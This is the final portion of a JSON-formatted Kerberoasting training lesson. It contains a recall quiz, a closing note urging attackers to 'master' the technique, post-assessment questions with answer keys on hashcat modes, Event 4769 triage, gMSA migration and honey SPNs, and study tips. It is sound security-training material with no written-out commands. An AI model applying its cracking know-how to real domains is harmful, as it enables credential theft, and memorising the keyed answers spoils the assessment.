hashcat mode for RC4 Kerberos tickets?\n4. What is the difference between a user service account and a gMSA?\n5. Name three tools for extracting TGS tickets.\n6. What encryption type value indicates RC4?\n7. What MITRE ATT&CK technique number is Kerberoasting?\n8. What is the \"SPUD\" framework?\n9. How long should service account passwords be to resist cracking?\n10. What's the difference between Event 4768 and 4769?\n\n**If you got 8+/10**: Excellent retention! You're ready for real-world application.\n**If you got 5-7/10**: Good foundation. Review the sections you missed.\n**If you got <5/10**: Re-read key sections and focus on the memory aids.\n\n## Final Thought\n\nKerberoasting is one of the most reliable Active Directory attack techniques because it exploits a **fundamental design characteristic** of Kerberos combined with **human password choices**. You can't change Kerberos, but you CAN change password policies and implement gMSAs.\n\n**For attackers**: This technique works in 90%+ of environments. Master it.\n**For defenders**: This technique works in 90%+ of environments. Fix it.\n\nYou now have the knowledge to both exploit and defend against Kerberoasting. Use it wisely."
    }
  ],
  "post_assessment": [
    {
      "question": "You've extracted a Kerberos TGS ticket for a service account. The ticket shows encryption type 0x12 (AES256-CTS-HMAC-SHA1-96). You attempt to crack it with hashcat using rockyou.txt with best64 rules. After 48 hours, the password hasn't cracked. What is the MOST LIKELY explanation?",
      "options": [
        "AES256 tickets cannot be cracked with hashcat; you need to use John the Ripper instead",
        "The service account password is longer than 14 characters and not in your wordlist or generated by your rules",
        "You used the wrong hashcat mode; AES256 tickets require mode 19700, not 13100",
        "The ticket is corrupted; you need to re-extract it using Rubeus instead of Impacket"
      ],
      "correct_option": 2,
      "explanation": "The most likely reason is that you used hashcat mode 13100, which is for RC4 Kerberos tickets (etype 23). For AES256 tickets (etype 18), you need mode 19700. Additionally, AES256 is significantly slower to crack than RC4, and if the password isn't in rockyou.txt or generatable by best64 rules, it won't crack regardless of time. Mode selection is critical: 13100 (RC4), 19600 (AES128), 19700 (AES256)."
    },
    {
      "question": "A security analyst notices the following Event 4769 entries within a 30-second window from user 'bob@corp.local': requests for MSSQLSvc/sql01, HTTP/sharepoint, TERMSRV/rds, CIFS/fileserver, HTTP/webapp, all with encryption type 0x17. However, 'bob' is a legitimate user who regularly accesses these services for his job. How can the analyst differentiate between legitimate access and a Kerberoasting attack?",
      "options": [
        "Legitimate users never request TGS tickets with RC4 encryption; all 0x17 tickets indicate attack",
        "Check if bob requested these tickets from his normal workstation IP and during business hours; attacks often come from unusual locations/times. Also verify if bob actually uses these services or just requested tickets without using them.",
        "The time window doesn't matter; 5 TGS requests in 30 seconds is always malicious regardless of the user",
        "There's no way to differentiate; the analyst should immediately disable bob's account and investigate"
      ],
      "correct_option": 1,
      "explanation": "While multiple TGS requests with RC4 encryption are suspicious, context matters. Legitimate users CAN request multiple tickets (e.g., logging in and accessing various services), and RC4 might still be enabled for legacy compatibility. The key differentiators are: (1) source IP (is it bob's normal workstation?), (2) timing (business hours vs. midnight?), (3) whether tickets were USED or just requested and cached, and (4) whether this pattern is normal for bob. Kerberoasting typically involves requesting tickets for services the user doesn't actually access. Additional investigation (not immediate account disable) is the correct response."
    },
    {
      "question": "Your organization has 15 service accounts with SPNs. Due to budget constraints, you can only migrate 5 to Group Managed Service Accounts (gMSAs) this quarter. Which prioritization framework should you use to select the 5 accounts?",
      "options": [
        "Migrate the 5 accounts with the oldest PasswordLastSet dates first, as these are most likely to have weak passwords",
        "Migrate accounts in this priority order: (1) Domain Admin members, (2) Accounts with RC4 encryption enabled, (3) Accounts with PasswordLastSet >1 year, (4) Accounts with highest privilege levels, (5) Most frequently accessed services",
        "Randomly select 5 accounts; all service accounts are equally at risk from Kerberoasting",
        "Migrate the 5 accounts that are easiest to convert (fewest dependencies) to build momentum and demonstrate success"
      ],
      "correct_option": 1,
      "explanation": "The correct approach is risk-based prioritization. Migrate accounts with the HIGHEST RISK first: (1) Domain Admin members (highest privilege = highest impact if compromised), (2) RC4 encryption enabled (faster to crack), (3) old passwords (likely weak, never rotated), (4) high privileges (even if not DA), (5) critical services. This minimizes risk most effectively. While 'easiest first' can build organizational momentum, it's not the security-optimal approach. Random selection ignores risk entirely. Age alone (option A) misses the critical factor of privilege level—a 5-year-old password on a low-privilege account is less critical than a 1-year-old password on a Domain Admin account."
    },
    {
      "question": "You've deployed a honey SPN (svc_honeypot with MSSQLSvc/sql-sensitive.corp.local:1433) that is a member of Domain Admins but should never be legitimately accessed. Three months later, you receive an alert that user 'alice@corp.local' requested a TGS ticket for this SPN. What is the MOST APPROPRIATE immediate response?",
      "options": [
        "Immediately disable alice's account and initiate incident response procedures; any access to a honey SPN is confirmed malicious activity",
        "Investigate alice's recent activity (logons, commands, network connections) and context (is her account potentially compromised? Is she a security team member testing defenses?). Then decide on response based on findings.",
        "Change the honey SPN's password and create a new honey account; the attacker now knows this one is a honeypot",
        "Ignore the alert; honey SPNs generate too many false positives to be actionable"
      ],
      "correct_option": 1,
      "explanation": "While honey SPNs have very low false positive rates (no legitimate access should occur), you must still investigate before taking disruptive action. Alice could be: (1) a compromised account being used by an attacker, (2) a security team member testing defenses, (3) running an automated tool that enumerated all SPNs, or (4) accidentally triggering a security scan. The correct response is: immediately investigate alice's recent activity, check if her account shows signs of compromise (unusual logons, lateral movement), verify she's not on the security team, and then respond appropriately. Immediate account disable (option A) could cause business disruption if alice is a legitimate user who made an error. Changing the honey account (C) doesn't address the active threat. Ignoring (D) defeats the purpose of honey SPNs."
    }
  ],
  "jim_kwik_principles": [
    "Focus: Kerberoasting requires deep understanding of Kerberos internals, not just tool execution. Focus on the 'why' behind each step.",
    "Active Recall: Test yourself on Event IDs, hashcat modes, SPN formats, and encryption types without looking at notes.",
    "Spaced Repetition: Review this lesson after 1 day, 1 week, and 1 month to ensure long-term retention.",
    "State Management: Study offensive techniques when you're energized and creative; study defensive measures when you're analytical and detail-oriented.",
    "Teach to Learn: Explain Kerberoasting to a colleague or write a blog post. Teaching solidifies understanding."
  ]
}